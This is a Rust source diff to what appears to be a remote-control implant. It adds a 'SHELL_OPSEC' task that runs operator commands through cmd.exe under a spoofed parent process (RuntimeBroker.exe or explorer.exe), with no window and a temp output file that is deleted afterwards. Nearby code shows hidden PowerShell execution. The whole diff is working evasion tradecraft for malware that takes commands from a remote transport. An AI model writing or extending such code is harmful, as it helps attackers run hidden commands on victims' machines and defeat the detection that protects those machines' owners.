@@ -382,6 +382,85 @@ fn shell(cmd: &str) -> String {
 }
 
 #[cfg(target_os = "windows")]
+unsafe fn shell_opsec(cmd: &str) -> String {
+    // Find RuntimeBroker.exe, fall back to explorer.exe for PPID spoof.
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snap == INVALID_HANDLE_VALUE { return shell(cmd); }
+    let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+    pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+    let mut rb_pid = 0u32;
+    let mut ex_pid = 0u32;
+    if Process32First(snap, &mut pe) != 0 {
+        loop {
+            let end = pe.szExeFile.iter().position(|&b| b == 0).unwrap_or(pe.szExeFile.len());
+            let name = String::from_utf8_lossy(&pe.szExeFile[..end]);
+            if name.eq_ignore_ascii_case("RuntimeBroker.exe") { rb_pid = pe.th32ProcessID; break; }
+            if ex_pid == 0 && name.eq_ignore_ascii_case("explorer.exe") { ex_pid = pe.th32ProcessID; }
+            if Process32Next(snap, &mut pe) == 0 { break; }
+        }
+    }
+    CloseHandle(snap);
+    let parent_pid = if rb_pid != 0 { rb_pid } else { ex_pid };
+    if parent_pid == 0 { return shell(cmd); }
+
+    let hparent = OpenProcess(PROCESS_CREATE_PROCESS, 0, parent_pid);
+    if hparent == 0 { return shell(cmd); }
+
+    // Build temp output path.
+    let pid = std::process::id();
+    let tick: u32 = {
+        use windows_sys::Win32::System::SystemInformation::GetTickCount;
+        GetTickCount()
+    };
+    let out_path = format!("C:\\Windows\\Temp\\sbo{:08x}{:08x}.tmp", pid, tick);
+    let cmdline = format!("cmd.exe /d /c {} > \"{}\" 2>&1\0", cmd, out_path);
+    let mut cmdline_w: Vec<u16> = cmdline.encode_utf16().collect();
+
+    let mut attr_size = 0usize;
+    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut attr_size);
+    let heap = GetProcessHeap();
+    let attr_list = HeapAlloc(heap, 0, attr_size) as LPPROC_THREAD_ATTRIBUTE_LIST;
+    if attr_list.is_null() { CloseHandle(hparent); return shell(cmd); }
+    InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size);
+    UpdateProcThreadAttribute(
+        attr_list, 0,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
+        &hparent as *const isize as *const _,
+        std::mem::size_of::<isize>(),
+        std::ptr::null_mut(),
+        std::ptr::null(),
+    );
+
+    let mut si: STARTUPINFOEXW = std::mem::zeroed();
+    si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+    si.lpAttributeList = attr_list;
+    let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+    let ok = CreateProcessW(
+        std::ptr::null(), cmdline_w.as_mut_ptr(),
+        std::ptr::null(), std::ptr::null(), 0,
+        EXTENDED_STARTUPINFO_PRESENT | 0x08000000, // CREATE_NO_WINDOW
+        std::ptr::null(), std::ptr::null(),
+        &si.StartupInfo, &mut pi,
+    );
+    DeleteProcThreadAttributeList(attr_list);
+    HeapFree(heap, 0, attr_list as *const _);
+    CloseHandle(hparent);
+
+    if ok == 0 { return shell(cmd); }
+
+    WaitForSingleObject(pi.hProcess, 30000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    let out = std::fs::read_to_string(&out_path).unwrap_or_else(|_| "[no output]".into());
+    let _ = std::fs::remove_file(&out_path);
+    out
+}
+
+#[cfg(not(target_os = "windows"))]
+fn shell_opsec(cmd: &str) -> String { shell(cmd) }
+
+#[cfg(target_os = "windows")]
 fn ps(script: &str) -> String {
     match Command::new("powershell.exe")
         .args(["-NoP", "-NonI", "-W", "Hidden", "-C", script])
@@ -1340,6 +1419,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
     let typ = task.typ.to_uppercase();
     match typ.as_str() {
         "SHELL" => {
+            t.send_result(task.id, &shell(&task.args), "");
+        }
+        "SHELL_OPSEC" => {
+            #[cfg(target_os = "windows")]
+            t.send_result(task.id, &unsafe { shell_opsec(&task.args) }, "");
+            #[cfg(not(target_os = "windows"))]
             t.send_result(task.id, &shell(&task.args), "");
         }
         "SLEEP" => {
